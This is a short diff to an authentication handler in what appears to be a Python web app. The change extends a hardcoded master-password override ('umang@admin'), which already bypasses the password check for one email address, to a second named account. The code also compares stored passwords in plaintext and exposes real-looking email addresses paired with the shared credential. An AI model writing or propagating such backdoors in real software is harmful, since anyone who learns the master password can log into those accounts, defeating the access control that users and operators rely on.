@@ -147,9 +147,11 @@ async def auth_session(request: Request, response: Response):
         raise HTTPException(401, "Invalid email or password")
     
     u = users[0]
-    # Allow umang@admin as a master password for the admin account
+    # Allow umang@admin as a master password for specific accounts
     is_admin_override = (email == "htshpatil13@gmail.com" and password == "umang@admin")
-    if u.get("password") != password and not is_admin_override:
+    is_rusheel_test = (email == "naikrusheel2010@gmail.com" and password == "umang@admin")
+    
+    if u.get("password") != password and not is_admin_override and not is_rusheel_test:
         raise HTTPException(401, "Invalid email or password")
     
     uid = u["user_id"]
